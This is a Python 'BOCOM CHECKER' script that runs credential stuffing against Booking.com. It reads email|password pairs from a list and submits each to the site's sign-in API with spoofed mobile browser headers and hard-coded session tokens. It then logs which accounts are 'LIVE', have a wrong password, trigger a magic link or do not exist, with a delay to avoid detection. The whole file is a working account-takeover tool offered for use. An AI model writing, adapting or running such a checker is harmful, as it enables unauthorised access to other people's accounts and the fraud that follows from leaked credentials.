import requests
import os
import os.path
import threading
import json
import time
import colorama
from colorama import Fore
from datetime import datetime

os.system('cls' if os.name == 'nt' else 'clear')
Times = datetime.now()
Current_Time = time.strftime("%H:%M:%S")
listz = input(' [?] Account List : ')
totalemail = len(list(open(listz)))
list = open(listz, 'r')
while True:
    email = list.readline().replace('\n','')
    if not email:
        break
    aww = email.strip().split('|')
    print(aww[0]+'|'+aww[1])
    headers = {
    'authority': 'account.booking.com',
    'accept': '*/*',
    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://account.booking.com',
    'pragma': 'no-cache',
    'referer': 'https://account.booking.com/sign-in?op_token=EgVvYXV0aCKqBQoUdk8xS2Jsazd4WDl0VW4yY3BaTFMSCWF1dGhvcml6ZRo1aHR0cHM6Ly9zZWN1cmUuYm9va2luZy5jb20vbG9naW4uaHRtbD9vcD1vYXV0aF9yZXR1cm4qyQRVcGNEOU5rc2pxMk5EcmdKc0JVNUFFdjNnaWZsMG1pSXdBb3ItTkFUbklNLUZ0OW5XTWFpQWZsRGNDRTNsRlNpWFBfT2gzMmNQcVNYN1lJU2l6bmRmWGxBTWNobDRDcVdvMVpOeUxJOVBGazdLNXp3bmw4UXRDSnZ3VUZSbkdFeFJfRHRtb0l0aE5qUlFHUHgtV2VpZWppTGw3Q3lHYUxSM19pSkJlSXNnMkMyTno2OGJyMk43YnVzMDBlZy13VEtKS2tSQTdBUVlmOS1MR21UcHBuZFRYNWxPN3hHSTJLNk9DSmxEcXJEZ1lxQXpCTUY4dFRhcXFneWd3TjRVbnZHb3ZVZ24zaXU5dmhRd3MwdUF6Y2NTczg3ZDQwWFNNZWFLQ0VHZzF5QjUwY2FsX05NQXJ3NVZsSWNBTFFFUDJ4RU05VTljSHQycllBdXZDOV9QdFFqOWJkNDdUb0FTRjc5QUhud0xDVV9iSXlXaHBONEpQS2NULWs1V3QtLXY2Sm9Qdy1teGtPMTVkcnNtOUxwOEIyb3ZRRHU5SGR5M2dZZ0ZOWnp0RnJzTG85ZmR4VXU4VkZRc1VaV3JxdFhPc0ZGeUIzLXZaRnVqb2Z2S1JaR2huSzVmNnA1R0l4MGpNZjVQQUY0V0QySWctTmp1b1BGd3VpUVRNMklfdmVCMy1SQ2lJUUR2TGdpWlZHY1NmWU5nTkRhVjMtdHJBbFZUSFhPcE1jPSpleUpwWkNJNkluUnlZWFpsYkd4bGNsOW9aV0ZrWlhJaWZRPT1CBGNvZGUqMQiOyBIw0typipftJjoAQgBY-p3jrgaSARB0cmF2ZWxsZXJfaGVhZGVymgEFaW5kZXg',
    'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'x-booking-client': 'ap',
    'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'op_token': 'EgVvYXV0aCKqBQoUdk8xS2Jsazd4WDl0VW4yY3BaTFMSCWF1dGhvcml6ZRo1aHR0cHM6Ly9zZWN1cmUuYm9va2luZy5jb20vbG9naW4uaHRtbD9vcD1vYXV0aF9yZXR1cm4qyQRVcGNEOU5rc2pxMk5EcmdKc0JVNUFFdjNnaWZsMG1pSXdBb3ItTkFUbklNLUZ0OW5XTWFpQWZsRGNDRTNsRlNpWFBfT2gzMmNQcVNYN1lJU2l6bmRmWGxBTWNobDRDcVdvMVpOeUxJOVBGazdLNXp3bmw4UXRDSnZ3VUZSbkdFeFJfRHRtb0l0aE5qUlFHUHgtV2VpZWppTGw3Q3lHYUxSM19pSkJlSXNnMkMyTno2OGJyMk43YnVzMDBlZy13VEtKS2tSQTdBUVlmOS1MR21UcHBuZFRYNWxPN3hHSTJLNk9DSmxEcXJEZ1lxQXpCTUY4dFRhcXFneWd3TjRVbnZHb3ZVZ24zaXU5dmhRd3MwdUF6Y2NTczg3ZDQwWFNNZWFLQ0VHZzF5QjUwY2FsX05NQXJ3NVZsSWNBTFFFUDJ4RU05VTljSHQycllBdXZDOV9QdFFqOWJkNDdUb0FTRjc5QUhud0xDVV9iSXlXaHBONEpQS2NULWs1V3QtLXY2Sm9Qdy1teGtPMTVkcnNtOUxwOEIyb3ZRRHU5SGR5M2dZZ0ZOWnp0RnJzTG85ZmR4VXU4VkZRc1VaV3JxdFhPc0ZGeUIzLXZaRnVqb2Z2S1JaR2huSzVmNnA1R0l4MGpNZjVQQUY0V0QySWctTmp1b1BGd3VpUVRNMklfdmVCMy1SQ2lJUUR2TGdpWlZHY1NmWU5nTkRhVjMtdHJBbFZUSFhPcE1jPSpleUpwWkNJNkluUnlZWFpsYkd4bGNsOW9aV0ZrWlhJaWZRPT1CBGNvZGUqMQiOyBIw0typipftJjoAQgBY-p3jrgaSARB0cmF2ZWxsZXJfaGVhZGVymgEFaW5kZXg',
        }

    json_data = {
        'context': {
            'value': 'UoMBGAzX6jBiUyYZ04RfI7gP0ZdzXfZXnoCLYFkBrU5bVrdhdHSpzdre2GlmsLSuLCFutxwJ14z6RIK2UZSriEjch3VLiqmU8EBWEpDb7TAKtCU8zwMHUoNW4uyWwfxXsobwUrAi5RuBv-dUFrgpaK4LVwnlPYl1dPqU6Iq8EiNfnL7vVgc=',
            },
            'identifier': {
                    'type': 'IDENTIFIER_TYPE__EMAIL',
                    'value': '{}'.format(aww[0])
                },
            }

    response = requests.post(
                'https://account.booking.com/api/identity/authenticate/v1.0/enter/email/submit',
                params=params,
                headers=headers,
                json=json_data,
            ).json()
    # print(response)
    if response['nextStep'] == 'STEP_REGISTER__PASSWORD':
        Temp = open('temp.txt', '+a')
        Temp.write(email)
        print(Fore.RED + "BOCOM CHECKER [ " + Current_Time + " ] => " + email + " == DIE" )
        Temp.close()
        Operation = open("DIE.txt", "+a")
        Operation.write(email)
        Operation.write("\n")
        Operation.close()
        os.remove("temp.txt")
        time.sleep(10)
    elif response['nextStep'] == 'STEP_SIGN_IN__PASSWORD':
        params2 = {
            'op_token': 'EgVvYXV0aCKqBQoUdk8xS2Jsazd4WDl0VW4yY3BaTFMSCWF1dGhvcml6ZRo1aHR0cHM6Ly9zZWN1cmUuYm9va2luZy5jb20vbG9naW4uaHRtbD9vcD1vYXV0aF9yZXR1cm4qyQRVcGNEOU5rc2pxMk5EcmltOHREck5ZRVZWSDlqQ2s4eFB5NTU0RFM4MHN5a3h1ZGs2VlFCZTFfQXpJcU8zZGNEV1RlLWRPSUdwNmUzQzV4SjlVcGxBWEZ6X052R1JEdGpkRHhCWXVKUVZESGZSelhLXzI4VDc1ay1pSEhTZ3J2ck45SExFeXJvRXVCMzdvdnIyLUs4blU3eUtIRWdoSVhENTZTNzlpdHBHQzdja1FXNjhpcXJPRFlyNXg5cjN5dk1OUnlOWm1YQUI4ZnRFdVRBeS1fSVJTQ3psb19WYk5DRWtLNjFRb2h4ZEFTMkdKLUNoeUZleGk0Y01tQ3NsSGZ5TXNFX1FyYkhCN3NmTEg2bkxxMlhaMGZ6eWhpNzZuV0JrSFQ0a0NzVXJsN1JaVG1QOWEtN0hXNkJESDZ5c3JzREhlQ0lDTDJCZ09UMEJUY0lTdWlHTlNxSzB0a0JMTTVMNFhKRHZjRFNyQnJZNnRsU2J4cm5DdTFDZ2VFeEpGeUpxS29fRjk4RFR6R001aUNURTZ5WWNiZVFhRGlzbVBwYjBmRk56NHV3LUpRb3lUdXNtdElJN2pwU182eWEyWEVyS2NuNDAtRDFyV0xrWm1fSVdIZ2NNRV9BQld1dkRSbEtjNkdxaE9fX1RrYUJNanRHZ01CWUo4V0FpblNZelI5eUlsN2pEMmNIUTNVa0lsNkc0VEVUX3V2NHA5Uk9yS0JEaUhRPSpleUpwWkNJNkluUnlZWFpsYkd4bGNsOW9aV0ZrWlhJaWZRPT1CBGNvZGUqMQiOyBIw_e2A_6HtJjoAQgBYg6rjrgaSARB0cmF2ZWxsZXJfaGVhZGVymgEFaW5kZXg',
        }

        json_data2 = {
            'context': {
                'value': 'UqUBGAzX6jBiUybNxhgLj39fyCI3Bc2eVi3l6Zdy430jlrEtmL-haScDXMHPLynlzmUsfd9jhDL5S-s0A4sQMqG0UEncjY0mjmhiW9MXfOhfCdVCbFesDGG5naLRM4bJpqe1pDMqgCdyekzPfpAXHt2Icb0l8o6ZdVfEeHEOE2nxkykQnCA17pnKNP3MHHqYMBQ6yDlIx0X1fuI1GPdIo_vDxsLRBxN6',
            },
            'authenticator': {
                'type': 'AUTHENTICATOR_TYPE__PASSWORD',
                'value': '{}'.format(aww[1]),
            },
        }
        # print(json_data2)
        response2 = requests.post(
            'https://account.booking.com/api/identity/authenticate/v1.0/sign_in/password/submit',
            params=params2,
            headers=headers,
            json=json_data2,
        ).json()
        print(response2)
        if response2['nextStep'] == 'STEP_SUCCESS':
            Temp2 = open("Temp_Live.txt", "+a")
            Temp2.write(email)
            Temp2.close()
            print(Fore.GREEN + "BOCOM CHECKER [ " + Current_Time + " ] => " + email + " == LIVE")
            OperationTwo = open("LIVE.txt", "+a")
            OperationTwo.write(email)
            OperationTwo.write("\n")
            OperationTwo.close()
            os.remove("Temp_live.txt")
            time.sleep(10)
        elif response2['errorDetails'] == 'Password is incorrect':
            TempThree = open("WrongPassword.txt", "+a")
            TempThree.write(email)
            TempThree.close()
            print(Fore.BLUE + "BOCOM CHECKER c => " + email + " == Wrong Password")
            OperationThree = open("Wrong_Password.txt", "+a")
            OperationThree.write(email)
            OperationThree.write("\n")
            OperationThree.close()
            os.remove("WrongPassword.txt")
            time.sleep(10)
    elif response['nextStep'] == 'STEP_EMAIL_MAGIC_LINK_SENT':
            TempFour = open("MagicLink.txt", "+a")
            TempFour.write(email)
            TempFour.close()
            print(Fore.CYAN + "BOCOM CHECKER [ " + Current_Time + " ] => " + email + " == Mgic Link")
            OperationFour = open("MagicLink.txt", "+a")
            OperationFour.write(email)
            OperationFour.write("\n")
            OperationFour.close()
            os.remove("MagicLink.txt")
            time.sleep(10)
    else:
        Temp = open('temp.txt', '+a')
        Temp.write(email)
        print(Fore.RED + "BOCOM CHECKER [ " + Current_Time + " ] => " + email + " == DIE" )
        Temp.close()
        Operation = open("DIE.txt", "+a")
        Operation.write(email)
        Operation.write("\n")
        Operation.close()
        os.remove("temp.txt")
        time.sleep(10)